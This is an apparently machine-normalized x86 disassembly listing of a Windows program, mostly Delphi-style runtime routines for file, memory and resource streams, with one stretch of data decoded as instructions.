cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41b488
pop ecx
mov eax [ ebx ]
call sub_403178
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41b488
pop ecx
sub_41b558
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41b5c8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
sub_41b600
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
sub_41b638
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41b3bc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_40276c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41b714
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b71b
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_40278c
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41b5c8
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41b600
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41b72c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41be14
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b77c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41de48
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b783
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
sub_41b794
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41be14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b7e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f5dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7eb
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_41b7f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b84c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408700
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41b88c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40d078
pop ebx
pop ebp
retn 0x8
sub_41b8b4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41b8f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b8f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41ba21
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403550
movzx edx di
mov eax esi
call sub_408624
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b7f0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4086a0
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b7f0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba28
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403fa0
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4088b8
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b2f8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4088b8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b2f8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
jmp r-xdata
sub_41ba28
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ba4c
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
call sub_408738
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_41ba88
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_402968
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41bac0
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41bae4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_41bb10
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_41bb28
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41b3bc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41b5c8
sub_41bb60
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41ba80
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41bb88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41bb60
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41bbb4
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406c7c
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406c60
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406c50
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
test ecx ecx
jne r-xdata
sub_41bc40
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_402968
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41bb60
sub_41bc90
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_40443c
mov ecx eax
mov edx esi
mov eax edi
call sub_41bd58
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_41bce8
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41bd4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd52
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_41bd58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41bce8
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41ba80
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41bce8
pop ecx
sub_41bdc4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406c4c
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_41be14
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_40276c
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_41be5c
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_40278c
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_41be8c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ esi + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0x180041
add [ eax ] al
and [ ecx ] dl
inc eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
add al al
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] dl
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
adc al al
inc ecx
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
dec esp
mov edi 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
mov edi 0x180041
add [ eax ] al
mov [ esi + 0x34340041 ] bh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40406c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044dc
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403fd0
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403fd0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41bf60
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403fd0
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403fd0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_41bfb8
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40406c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044dc
mov al 0x1
inc ebx
sub_41c010
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c087
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4058a0
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_415a28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c08e
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_414d70
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4058a0
mov ecx eax
mov eax esi
pop edx
call sub_40d56c
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4058a0
sub_41c094
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41c13a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c141
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40406c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4217f4
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407fbc
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41c15c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418e20
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418e20
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418c68
sub_41c194
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418e20
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418e20
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_418cb4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418c68
sub_41c1dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41c375
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_419188
mov edi eax
xor edx edx
push ebp
push sub_41c356
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c35d
mov eax [ rw-data ]
call sub_4191ec
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41c337
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41c2e5
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_418dc4
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_418784
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c2ec
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414ff8
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41c15c
pop ecx
mov edx esi
mov eax edi
call sub_418cb4
mov eax ebx
call sub_4031ec
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41c094
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41c194
pop ecx
inc esi
sub_41c2ec
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
sub_41c384
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_419188
mov edi eax
xor eax eax
push ebp
push sub_41c41f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4191ec
retn
mov edx ebx
mov eax edi
call sub_418dc4
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_418cb4
mov eax esi
call sub_4031ec
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407fbc
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41c430
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_419188
mov edi eax
xor eax eax
push ebp
push sub_41c4a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4191ec
retn
mov edx ebx
mov eax edi
call sub_418dc4
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_418cb4
mov eax esi
call sub_4031ec
sub_41c4d8
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
pop ecx
pop edx
pop ebx
retn
sub_41c51c
push ebx
push esi
push edi
call sub_4035b8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41be5c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_41c558
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41e430
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41e540
call sub_41c4cc
sub_41c57c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407fbc
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403f7c
sub_41c5b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
